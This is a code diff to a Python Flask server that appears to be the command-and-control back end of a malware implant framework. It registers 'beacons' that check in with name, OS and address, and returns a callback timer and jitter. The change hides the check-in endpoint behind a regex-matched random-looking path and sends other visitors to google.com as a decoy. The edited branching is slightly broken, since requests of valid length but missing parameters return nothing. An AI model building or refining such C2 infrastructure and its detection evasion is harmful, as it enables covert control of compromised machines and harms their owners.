@@ -1,13 +1,24 @@
 from flask import Flask, request, jsonify, redirect, send_file
+import re
 import uuid
 import time
 import logging
 from Modules.global_objects import beacons, add_beacon_list, beacon_commands
+from werkzeug.routing import BaseConverter
+
 
 app = Flask(__name__)
 log = logging.getLogger('werkzeug')
 app.logger.setLevel(logging.ERROR)
 log.setLevel(logging.ERROR)
+
+
+class RegexConverter(BaseConverter):
+    def __init__(self, map, *items):
+        super().__init__(map)
+        self.regex = items[0]
+
+app.url_map.converters['regex'] = RegexConverter
 
 
 @app.route('/')
@@ -20,16 +31,17 @@ def catch_all(unknown_path):
     return redirect('https://www.google.com')
 
 
-@app.route('/connection', methods=['GET'])
-def connection():
-    name = request.args.get('name')
-    os = request.args.get('os')
-    address = request.args.get('address')
-
-    if name and os and address:
-        userID = str(uuid.uuid4())
-        add_beacon_list(userID, address, name, os, time.asctime(), 5, 10)
-        return {"timer": 5, "uuid": userID, "jitter": 10}, 200
+# Connect URL
+@app.route('/<regex("^h.*_2.*$"):custom_param>', methods=['GET'])
+def connection(custom_param):
+    if 5 <= len(custom_param) <= 10:
+        if request.args.get('name') and request.args.get('os') and request.args.get('address'):
+            name = request.args.get('name')
+            os = request.args.get('os')
+            address = request.args.get('address')
+            userID = str(uuid.uuid4())
+            add_beacon_list(userID, address, name, os, time.asctime(), 5, 10)
+            return {"timer": 5, "uuid": userID, "jitter": 10}, 200
     else:
         return Flask.redirect("https://www.google.com", code=302)
 
